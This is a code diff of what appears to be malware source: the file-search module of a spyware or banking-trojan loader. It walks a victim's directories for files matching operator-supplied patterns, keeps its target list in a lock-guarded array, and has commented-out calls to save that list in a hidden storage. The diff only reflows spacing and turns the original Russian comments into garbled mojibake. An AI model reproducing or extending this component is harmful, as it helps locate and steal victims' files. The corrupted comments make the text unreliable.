@@ -27,7 +27,7 @@ static void SaveQuest(void)
   DWORD dwSize = 0;
   LPSTR ps;
 
-  CWA(kernel32, EnterCriticalSection)(&csfs);
+  CWA (kernel32, EnterCriticalSection) (& csfs);
   for(DWORD i = 0; i < dwQuestsCount; i++)if(pQuests[i] && (ps = Str::_unicodeToAnsiEx(pQuests[i], -1)))
   {
     DWORD s = Str::_LengthA(ps);
@@ -40,8 +40,8 @@ static void SaveQuest(void)
     }
     Mem::free(ps);
   }
-  CWA(kernel32, LeaveCriticalSection)(&csfs);
-  //RegStorage::SaveData(RSUT_COMMON, REGSTORAGE_DATA_FSQUEST, (LPBYTE)pBuf, dwSize);
+  CWA (kernel32, LeaveCriticalSection) (& csfs);
+  //RegStorage:: SaveData (RSUT_COMMON, REGSTORAGE_DATA_FSQUEST, (LPBYTE) pBuf, dwSize);
   Mem::free(pBuf);
 }
 
@@ -49,7 +49,7 @@ static bool ListDir(LPWSTR pDir, LOADERSPYDATA *plsd)
 {
   WCHAR Path[MAX_PATH];
   Fs::_pathCombine(Path, pDir, L"*");
-  Path[MAX_PATH - 1] = 0; //�� ������ ������
+  Path[MAX_PATH - 1] = 0; //pїЅpїЅ pїЅpїЅpїЅpїЅpїЅpїЅ pїЅpїЅpїЅpїЅpїЅpїЅ
   WIN32_FIND_DATAW wfd;
   HANDLE hS = CWA(kernel32, FindFirstFileW)(Path, &wfd);
   if(hS == INVALID_HANDLE_VALUE)return false;
@@ -66,7 +66,7 @@ static bool ListDir(LPWSTR pDir, LOADERSPYDATA *plsd)
       continue;
     }
 
-    CWA(kernel32, EnterCriticalSection)(&csfs);
+    CWA (kernel32, EnterCriticalSection) (& csfs);
     for(DWORD i = 0; i < dwQuestsCount; i++)if(pQuests[i] && wfd.nFileSizeHigh == 0 && CWA(shlwapi, PathMatchSpecW)(wfd.cFileName, pQuests[i]))
     {
       Fs::_pathCombine(Path, pDir, wfd.cFileName);
@@ -80,7 +80,7 @@ static bool ListDir(LPWSTR pDir, LOADERSPYDATA *plsd)
         break;
       }
     }
-    CWA(kernel32, LeaveCriticalSection)(&csfs);
+    CWA (kernel32, LeaveCriticalSection) (& csfs);
     CWA(kernel32, Sleep)(20);
   }
   while(dwQuestsCount > 0 && CWA(kernel32, FindNextFileW)(hS, &wfd));
@@ -98,10 +98,10 @@ static void WINAPI FSProc(LOADERSPYDATA *plsd)
   {
     DWORD dwTmp;
 
-    //���� �������
-    //CWA(kernel32, EnterCriticalSection)(&csfs);
+    //pїЅpїЅpїЅpїЅ pїЅpїЅpїЅpїЅpїЅpїЅpїЅ
+    //CWA (kernel32, EnterCriticalSection) (& csfs);
     //dwTmp = dwQuestsCount;
-    //CWA(kernel32, LeaveCriticalSection)(&csfs);
+    //CWA (kernel32, LeaveCriticalSection) (& csfs);
     if(dwQuestsCount == 0)continue;
 
     WCHAR Path[8];
@@ -134,7 +134,7 @@ bool FileSearch::StartThread(LOADERSPYDATA *plsd)
   dwQuestsCount = 0;
 
   LPBYTE pList = NULL;
-  DWORD dwListSize = 0;//RegStorage::LoadData(RSUT_COMMON, REGSTORAGE_DATA_FSQUEST, &pList);
+  DWORD dwListSize = 0;//RegStorage:: LoadData (RSUT_COMMON, REGSTORAGE_DATA_FSQUEST, & pList);
   if(dwListSize)
   {
     AddQuest((LPSTR)pList, dwListSize);
@@ -154,7 +154,7 @@ bool FileSearch::AddQuest(LPSTR pExts, DWORD dwSize)
 
   if(dwCount)
   {
-    CWA(kernel32, EnterCriticalSection)(&csfs);
+    CWA (kernel32, EnterCriticalSection) (& csfs);
     if(Mem::reallocEx(&pQuests, (dwQuestsCount + dwCount) * sizeof(LPWSTR)))for(DWORD i = 0; i < dwCount; i++)
     {
       if((pQuests[dwQuestsCount] = Str::_ansiToUnicodeEx(pArgs[i], -1)) != NULL)
@@ -164,7 +164,7 @@ bool FileSearch::AddQuest(LPSTR pExts, DWORD dwSize)
       }
     }
     SaveQuest();
-    CWA(kernel32, LeaveCriticalSection)(&csfs);
+    CWA (kernel32, LeaveCriticalSection) (& csfs);
     Mem::freeArrayOfPointers(pArgs, dwCount);
   }
   return ok;
@@ -179,7 +179,7 @@ bool FileSearch::RemoveQuest(LPSTR pExts, DWORD dwSize)
 
   if(dwCount)
   {
-    CWA(kernel32, EnterCriticalSection)(&csfs);
+    CWA (kernel32, EnterCriticalSection) (& csfs);
     for(DWORD k = 0; k < dwCount; k++)if((pA = Str::_ansiToUnicodeEx(pArgs[k], -1)))
     {
       for(DWORD i = 0; i < dwQuestsCount; i++)if(pQuests[i] && CWA(kernel32, lstrcmpiW)(pQuests[i], pA) == 0)
@@ -197,7 +197,7 @@ bool FileSearch::RemoveQuest(LPSTR pExts, DWORD dwSize)
       dwQuestsCount = 0;
       Mem::free(pQuests);
     }
-    CWA(kernel32, LeaveCriticalSection)(&csfs);
+    CWA (kernel32, LeaveCriticalSection) (& csfs);
     Mem::freeArrayOfPointers(pArgs, dwCount);
   }
 
